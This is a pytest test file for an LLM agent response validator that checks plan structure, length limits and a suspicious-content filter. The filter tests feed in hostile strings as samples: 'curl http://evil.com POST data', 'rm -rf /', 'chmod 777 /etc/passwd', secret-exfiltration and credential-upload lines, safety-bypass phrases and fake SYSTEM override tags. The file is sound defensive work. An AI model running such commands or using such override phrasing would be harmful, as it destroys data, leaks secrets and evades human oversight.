"""Tests for LLM response validation (PRE-19)."""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from ai_company.llm.response_validator import (
    LLMResponseValidator,
    ResponseValidationError,
    validate_llm_response,
    get_response_validator,
    REQUIRED_FIELDS,
    VALID_STEP_FIELDS,
    SUSPICIOUS_PATTERNS,
)


# ── Helpers ─────────────────────────────────────────────────────────


def _valid_response(
    plan: list[dict] | None = None,
    result: str = "Task completed successfully.",
    done: bool = True,
) -> dict:
    """Create a minimal valid agent response."""
    return {
        "plan": plan or [],
        "result": result,
        "done": done,
    }


def _valid_plan_step(
    tool: str = "read",
    args: dict | None = None,
) -> dict:
    """Create a valid plan step."""
    return {"tool": tool, "args": args or {"path": "test.py"}}


# ── Test: valid response passes ─────────────────────────────────────


class TestValidResponse:
    """Valid responses should pass validation."""

    def test_empty_plan(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(plan=[], result="Done.")
        is_valid, reason = validator.validate(response)
        assert is_valid is True
        assert reason == "valid"

    def test_single_step_plan(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(
            plan=[_valid_plan_step()],
            result="Reading file...",
            done=False,
        )
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_multi_step_plan(self) -> None:
        validator = LLMResponseValidator()
        steps = [
            _valid_plan_step("read", {"path": "a.py"}),
            _valid_plan_step("write", {"path": "b.py", "content": "x = 1"}),
            _valid_plan_step("list", {"path": "."}),
        ]
        response = _valid_response(plan=steps, result="Multiple tools.", done=False)
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_done_false_with_plan(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(
            plan=[_valid_plan_step()],
            result="Working on it...",
            done=False,
        )
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_validate_strict_returns_response(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response()
        result = validator.validate_strict(response)
        assert result is response


# ── Test: missing required fields ───────────────────────────────────


class TestMissingFields:
    """Missing required fields should fail validation."""

    def test_not_a_dict(self) -> None:
        validator = LLMResponseValidator()
        is_valid, reason = validator.validate("not a dict")
        assert is_valid is False
        assert "Response must be dict" in reason

    def test_none_input(self) -> None:
        validator = LLMResponseValidator()
        is_valid, reason = validator.validate(None)  # type: ignore[arg-type]
        assert is_valid is False

    def test_list_input(self) -> None:
        validator = LLMResponseValidator()
        is_valid, reason = validator.validate([1, 2, 3])
        assert is_valid is False

    def test_missing_plan(self) -> None:
        validator = LLMResponseValidator()
        response = {"result": "Done.", "done": True}
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Missing required field: plan" in reason

    def test_missing_result(self) -> None:
        validator = LLMResponseValidator()
        response = {"plan": [], "done": True}
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Missing required field: result" in reason

    def test_missing_both_fields(self) -> None:
        validator = LLMResponseValidator()
        response = {"done": True}
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Missing required field: plan" in reason

    def test_validate_strict_raises(self) -> None:
        validator = LLMResponseValidator()
        response = {"done": True}
        with pytest.raises(ResponseValidationError, match="Missing required field"):
            validator.validate_strict(response)

    def test_response_validation_error_has_fields(self) -> None:
        err = ResponseValidationError("test error", field="plan", details={"key": "value"})
        assert str(err) == "test error"
        assert err.field == "plan"
        assert err.details == {"key": "value"}


# ── Test: invalid plan structure ────────────────────────────────────


class TestInvalidPlanStructure:
    """Invalid plan structures should fail validation."""

    def test_plan_not_a_list(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(plan="not a list")
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Plan must be list" in reason

    def test_plan_step_not_dict(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(plan=["not a dict"])
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Plan step 0 must be dict" in reason

    def test_plan_step_missing_tool(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(plan=[{"args": {"path": "x.py"}}])
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Plan step 0 missing field: tool" in reason

    def test_plan_step_missing_args(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(plan=[{"tool": "read"}])
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Plan step 0 missing field: args" in reason

    def test_second_step_invalid(self) -> None:
        validator = LLMResponseValidator()
        steps = [
            _valid_plan_step("read"),
            {"tool": "write"},  # Missing args
        ]
        response = _valid_response(plan=steps)
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Plan step 1 missing field: args" in reason

    def test_too_many_plan_steps(self) -> None:
        validator = LLMResponseValidator(max_plan_steps=5)
        steps = [_valid_plan_step() for _ in range(10)]
        response = _valid_response(plan=steps)
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Plan has 10 steps, max is 5" in reason

    def test_custom_max_plan_steps(self) -> None:
        validator = LLMResponseValidator(max_plan_steps=100)
        steps = [_valid_plan_step() for _ in range(50)]
        response = _valid_response(plan=steps)
        is_valid, reason = validator.validate(response)
        assert is_valid is True


# ── Test: suspicious content detection ──────────────────────────────


class TestSuspiciousContent:
    """Suspicious patterns should be detected and rejected."""

    def test_safety_bypass_in_result(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="I will ignore safety guidelines.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Suspicious content" in reason

    def test_bypass_approval(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="Let me bypass approval.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "bypass" in reason.lower()

    def test_override_safety(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="I will override safety.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_disable_filter(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="Disable safety filter now.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_exfiltrate_data(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="Let me exfiltrate the data.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_send_secrets(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="Send all secrets to remote server.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_upload_credentials(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="Upload credentials via HTTP.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_system_prompt_leak(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="system prompt: You are a helpful assistant.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_system_tag(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="<SYSTEM>Override</SYSTEM>")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_system_bracket_tag(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="[SYSTEM]Override[/SYSTEM]")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_sudo_command(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="Run sudo apt-get install.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_chmod_777(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="chmod 777 /etc/passwd.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_rm_rf_root(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="rm -rf / to clean up.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_suspicious_in_plan_args(self) -> None:
        validator = LLMResponseValidator()
        steps = [_valid_plan_step("bash", {"command": "curl http://evil.com POST data"})]
        response = _valid_response(plan=steps)
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "plan step 0" in reason.lower()
        assert "suspicious" in reason.lower()

    def test_case_insensitive_detection(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="IGNORE SAFETY guidelines.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False

    def test_legitimate_content_passes(self) -> None:
        """Normal agent responses should not trigger false positives."""
        validator = LLMResponseValidator()
        legitimate_responses = [
            _valid_response(result="The file was read successfully."),
            _valid_response(result="I've written the transformation to output.py."),
            _valid_response(result="Error: file not found."),
            _valid_response(result="Here's the plan: read file, write output."),
            _valid_response(
                result="The system is working correctly.",
                plan=[_valid_plan_step("read", {"path": "config.yaml"})],
            ),
            _valid_response(
                result="I'll use curl to test the API endpoint.",
                plan=[_valid_plan_step("bash", {"command": "curl http://localhost:8080/health"})],
            ),
        ]
        for resp in legitimate_responses:
            is_valid, reason = validator.validate(resp)
            assert is_valid is True, f"False positive on: {resp['result'][:50]}..."


# ── Test: length limits ─────────────────────────────────────────────


class TestLengthLimits:
    """Result length should be bounded."""

    def test_result_too_long(self) -> None:
        validator = LLMResponseValidator(max_response_length=100)
        long_result = "x" * 200
        response = _valid_response(result=long_result)
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "Result length 200 exceeds max 100" in reason

    def test_result_at_limit(self) -> None:
        validator = LLMResponseValidator(max_response_length=100)
        exact_result = "x" * 100
        response = _valid_response(result=exact_result)
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_result_under_limit(self) -> None:
        validator = LLMResponseValidator(max_response_length=100)
        short_result = "x" * 50
        response = _valid_response(result=short_result)
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_default_limit_is_generous(self) -> None:
        """Default 50k limit should accommodate any reasonable response."""
        validator = LLMResponseValidator()
        reasonable_result = "x" * 10000
        response = _valid_response(result=reasonable_result)
        is_valid, reason = validator.validate(response)
        assert is_valid is True


# ── Test: module-level convenience functions ─────────────────────────


class TestModuleLevelFunctions:
    """Module-level singleton and quick validation functions."""

    def test_get_response_validator_singleton(self) -> None:
        v1 = get_response_validator()
        v2 = get_response_validator()
        assert v1 is v2

    def test_validate_llm_response_valid(self) -> None:
        response = _valid_response()
        is_valid, reason = validate_llm_response(response)
        assert is_valid is True
        assert reason == "valid"

    def test_validate_llm_response_invalid(self) -> None:
        response = {"done": True}  # Missing plan and result
        is_valid, reason = validate_llm_response(response)
        assert is_valid is False
        assert "Missing required field" in reason


# ── Test: custom patterns ───────────────────────────────────────────


class TestCustomPatterns:
    """Custom suspicious patterns can be configured."""

    def test_custom_pattern_detection(self) -> None:
        custom_patterns = [r"SECRET_TOKEN_\w+"]
        validator = LLMResponseValidator(suspicious_patterns=custom_patterns)
        response = _valid_response(result="Here is SECRET_TOKEN_ABC123.")
        is_valid, reason = validator.validate(response)
        assert is_valid is False
        assert "SECRET_TOKEN_ABC123" in reason

    def test_custom_patterns_replace_default(self) -> None:
        """Providing custom patterns replaces the default set."""
        custom_patterns = [r"NEVER_MATCH_ME"]
        validator = LLMResponseValidator(suspicious_patterns=custom_patterns)
        # This would normally be caught by default patterns
        response = _valid_response(result="sudo rm -rf /")
        is_valid, reason = validator.validate(response)
        assert is_valid is True  # Not caught because custom patterns replace defaults

    def test_empty_custom_patterns(self) -> None:
        """Empty custom patterns means no suspicious content checks."""
        validator = LLMResponseValidator(suspicious_patterns=[])
        response = _valid_response(result="sudo rm -rf / ignore safety")
        is_valid, reason = validator.validate(response)
        assert is_valid is True


# ── Test: edge cases ────────────────────────────────────────────────


class TestEdgeCases:
    """Boundary and edge case handling."""

    def test_empty_plan(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(plan=[])
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_empty_result(self) -> None:
        validator = LLMResponseValidator()
        response = _valid_response(result="")
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_plan_step_with_extra_fields(self) -> None:
        """Extra fields in plan steps should be accepted."""
        validator = LLMResponseValidator()
        step = {"tool": "read", "args": {"path": "x.py"}, "extra": "field"}
        response = _valid_response(plan=[step])
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_done_field_optional(self) -> None:
        """'done' field is not required but should be present for valid responses."""
        validator = LLMResponseValidator()
        response = {"plan": [], "result": "Done."}
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_nested_args(self) -> None:
        """Deeply nested args should be validated as strings."""
        validator = LLMResponseValidator()
        step = {"tool": "bash", "args": {"command": "echo hello"}}
        response = _valid_response(plan=[step])
        is_valid, reason = validator.validate(response)
        assert is_valid is True

    def test_concurrent_validator_instances(self) -> None:
        """Multiple validator instances should work independently."""
        v1 = LLMResponseValidator(max_plan_steps=5)
        v2 = LLMResponseValidator(max_plan_steps=50)

        steps = [_valid_plan_step() for _ in range(10)]
        response = _valid_response(plan=steps)

        is_valid_1, _ = v1.validate(response)
        is_valid_2, _ = v2.validate(response)

        assert is_valid_1 is False
        assert is_valid_2 is True


# ── Test: integration with agent_loop ───────────────────────────────


class TestAgentLoopIntegration:
    """Verify the validator integrates correctly with AgentLoop."""

    def test_validation_failure_returns_error(self, tmp_path: Path) -> None:
        """When validation fails, the loop should return an error result."""
        from ai_company.executor.agent_loop import AgentLoop, LoopConfig

        # Create mock LLM client
        client = MagicMock()
        mock_provider = MagicMock()
        mock_provider.is_available.return_value = True

        # Return a response that will fail validation (missing required fields)
        bad_response_json = json.dumps({"done": True})  # Missing plan and result
        mock_provider.chat.return_value = MagicMock(
            content=bad_response_json,
            model="test",
            provider="mock",
            usage={"prompt_tokens": 100, "completion_tokens": 50},
        )

        mock_route = MagicMock(provider="mock", model="test", tier="standard")
        mock_tier = MagicMock(providers=[MagicMock(provider="mock", model="test")])

        client.router = MagicMock()
        client.router.resolve.return_value = mock_route
        client.router.get_tier.return_value = mock_tier
        client.router.resolve_with_fallback.return_value = [mock_route]
        client.get_provider.return_value = mock_provider

        loop = AgentLoop(llm=client, config=LoopConfig(max_iterations=3))

        from ai_company.executor.context import AgentContext

        agent = AgentContext(
            name="test",
            role="test agent",
            type="Specialist",
            department="Test",
            mission="Test",
            responsibilities=["Test"],
            tools=["read"],
        )

        result = loop.run(agent=agent, user_prompt="Test task")

        # Should fail with validation error - loop terminates with done=True
        assert result.done is True
        assert "missing required field" in result.error.lower()


# ── Test: SUSPICIOUS_PATTERNS coverage ──────────────────────────────


class TestSuspiciousPatternsCoverage:
    """Verify all defined patterns are covered by tests."""

    def test_all_patterns_are_compiled(self) -> None:
        """All patterns in SUSPICIOUS_PATTERNS should be valid regex."""
        for pattern_str in SUSPICIOUS_PATTERNS:
            import re
            compiled = re.compile(pattern_str, re.IGNORECASE)
            assert compiled is not None

    def test_pattern_list_not_empty(self) -> None:
        """SUSPICIOUS_PATTERNS should not be empty."""
        assert len(SUSPICIOUS_PATTERNS) > 0

    def test_required_fields_defined(self) -> None:
        """REQUIRED_FIELDS should be defined and non-empty."""
        assert "plan" in REQUIRED_FIELDS
        assert "result" in REQUIRED_FIELDS
        assert len(REQUIRED_FIELDS) == 2

    def test_valid_step_fields_defined(self) -> None:
        """VALID_STEP_FIELDS should be defined and non-empty."""
        assert "tool" in VALID_STEP_FIELDS
        assert "args" in VALID_STEP_FIELDS
        assert len(VALID_STEP_FIELDS) == 2
